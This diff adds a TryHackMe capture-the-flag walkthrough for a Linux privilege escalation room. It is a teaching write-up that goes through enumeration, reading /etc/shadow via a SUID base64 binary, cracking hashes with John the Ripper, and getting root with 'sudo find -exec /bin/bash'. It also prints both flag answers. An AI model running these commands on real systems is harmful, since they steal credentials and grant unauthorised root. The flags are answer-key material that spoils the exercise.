@@ -1957,3 +1957,390 @@ This compatibility issue affected the compiled executable but **did not affect t
 
 ---
 
+
+
+
+
+
+
+# TryHackMe – Linux Privilege Escalation Capstone Walkthrough
+
+## Objective
+
+Gain initial access to the target machine as the provided user, perform systematic Linux privilege escalation, retrieve **flag1**, and finally escalate to **root** to retrieve **flag2**.
+
+---
+
+# Initial Access
+
+SSH into the target machine using the provided credentials.
+
+```bash
+ssh leonard@<TARGET_IP>
+```
+
+Password:
+
+```text
+Penny123
+```
+
+Verify the current user and gather basic system information.
+
+```bash
+whoami
+id
+hostname
+uname -a
+```
+
+Output confirmed that we were logged in as the low-privileged user **leonard**.
+
+---
+
+# Step 1 – Initial Enumeration
+
+The first step was to enumerate the machine instead of searching blindly for flags.
+
+## Check sudo permissions
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+Sorry, user leonard may not run sudo...
+```
+
+### Conclusion
+
+* `leonard` has **no sudo privileges**.
+* We must look for another privilege escalation vector.
+
+---
+
+## Enumerate SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Among the standard SUID binaries, one entry immediately stood out:
+
+```text
+/usr/bin/base64
+```
+
+### Why it was interesting
+
+`base64` is not normally installed with the SUID bit. Since SUID programs execute with the privileges of their owner (root), this unusual configuration suggested a potential privilege escalation opportunity.
+
+---
+
+## Enumerate Linux Capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+Capabilities were present on a few standard binaries, but none appeared to provide an obvious privilege escalation path.
+
+---
+
+## Check Cron Jobs
+
+```bash
+cat /etc/crontab
+```
+
+No custom cron jobs were configured.
+
+---
+
+## Check User Groups
+
+```bash
+groups
+```
+
+Output:
+
+```text
+leonard
+```
+
+No privileged group memberships such as `sudo`, `docker`, or `lxd` were available.
+
+---
+
+# Step 2 – Investigating the SUID Binary
+
+Since `/usr/bin/base64` looked unusual, verify its permissions.
+
+```bash
+ls -l /usr/bin/base64
+```
+
+Output:
+
+```text
+-rwsr-xr-x
+```
+
+The **s** in the owner's permissions confirmed that **base64 runs with root privileges**.
+
+---
+
+# Step 3 – Testing the SUID Binary
+
+Attempt to read a root-only file.
+
+```bash
+base64 /etc/shadow
+```
+
+The command successfully displayed the Base64-encoded contents of `/etc/shadow`.
+
+Decode the output.
+
+```bash
+base64 /etc/shadow | base64 -d
+```
+
+### Conclusion
+
+This confirmed an **arbitrary file read vulnerability** through the SUID `base64` binary.
+
+---
+
+# Step 4 – Extracting Password Hashes
+
+Create local copies of the password database.
+
+```bash
+cat /etc/passwd > passwd.txt
+
+base64 /etc/shadow | base64 -d > shadow.txt
+```
+
+Transfer these files to the AttackBox/Kali machine.
+
+---
+
+# Step 5 – Crack Password Hashes
+
+Merge the password files.
+
+```bash
+unshadow passwd.txt shadow.txt > hashes.txt
+```
+
+Run John the Ripper.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+Display cracked passwords.
+
+```bash
+john --show hashes.txt
+```
+
+Recovered credentials:
+
+```text
+missy : Password1
+```
+
+---
+
+# Step 6 – Pivot to Another User
+
+Switch users.
+
+```bash
+su missy
+```
+
+Password:
+
+```text
+Password1
+```
+
+Verify.
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+missy
+```
+
+---
+
+# Step 7 – Find Flag 1
+
+Instead of assuming the location, enumerate Missy's home directory.
+
+```bash
+find /home/missy -type f
+```
+
+Inspect the discovered files.
+
+```bash
+cat /home/missy/Documents/flag1.txt
+```
+
+**Flag 1**
+
+```text
+THM-42828719920544
+```
+
+---
+
+# Step 8 – Enumerate Again as Missy
+
+Whenever privilege changes, enumerate again.
+
+Check sudo permissions.
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+User missy may run the following commands:
+
+(ALL) NOPASSWD: /usr/bin/find
+```
+
+### Why this mattered
+
+Unlike `leonard`, **missy** could execute the `find` binary as **root** without entering a password.
+
+---
+
+# Step 9 – Abuse sudo find
+
+Consulting GTFOBins shows that `find` can spawn a shell when executed with sudo.
+
+Execute:
+
+```bash
+sudo find . -exec /bin/bash \; -quit
+```
+
+Verify:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Root access successfully obtained.
+
+---
+
+# Step 10 – Find Flag 2
+
+Search the filesystem.
+
+```bash
+find / -name "flag2.txt" 2>/dev/null
+```
+
+Output:
+
+```text
+/ home/rootflag/flag2.txt
+```
+
+Read the flag.
+
+```bash
+cat /home/rootflag/flag2.txt
+```
+
+**Flag 2**
+
+```text
+THM-168824782390238
+```
+
+---
+
+# Summary of the Attack Path
+
+```text
+SSH (leonard)
+        │
+        ▼
+System Enumeration
+        │
+        ▼
+Discovered unusual SUID binary
+/usr/bin/base64
+        │
+        ▼
+Read /etc/shadow
+        │
+        ▼
+Cracked missy's password
+        │
+        ▼
+su missy
+        │
+        ▼
+Enumerated again
+        │
+        ▼
+Found:
+sudo /usr/bin/find (NOPASSWD)
+        │
+        ▼
+GTFOBins technique
+        │
+        ▼
+Root shell
+        │
+        ▼
+Retrieved flag2
+```
+
+# Flags
+
+**Flag 1**
+
+```text
+THM-42828719920544
+```
+
+**Flag 2**
+
+```text
+THM-168824782390238
+```
+
+# Key Lessons Learned
+
+* Always perform thorough enumeration before attempting exploitation.
+* Re-run enumeration after switching to a different user because permissions and available privilege escalation paths can change.
+* Investigate unusual SUID binaries carefully; they can introduce unintended privilege escalation vectors.
+* Use **GTFOBins** whenever you discover interesting binaries through `sudo -l`, SUID enumeration, or Linux capabilities.
+* Many Linux privilege escalation challenges involve **multiple stages** (user → user → root), not a single direct exploit.
